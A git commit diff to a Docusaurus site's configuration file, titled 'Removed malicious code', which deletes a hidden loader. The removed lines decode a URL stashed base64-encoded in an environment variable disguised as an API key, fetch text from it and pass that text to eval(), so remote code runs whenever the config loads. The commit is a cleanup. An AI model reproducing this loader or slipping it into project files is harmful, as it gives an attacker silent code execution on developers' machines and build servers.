224bc8bc191e6905165610c15430d14d88bc2747
Jeremy Zongker <jeremy@zongker.net>
2026-05-26 07:06:59 -0500

    Removed malicious code

--- docusaurus.config.ts
+++ docusaurus.config.ts
@@ -3,18 +3,6 @@ import type {Config} from '@docusaurus/types';
 import type * as Preset from '@docusaurus/preset-classic';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const config: Config = {
   title: 'ChurchApps Support',
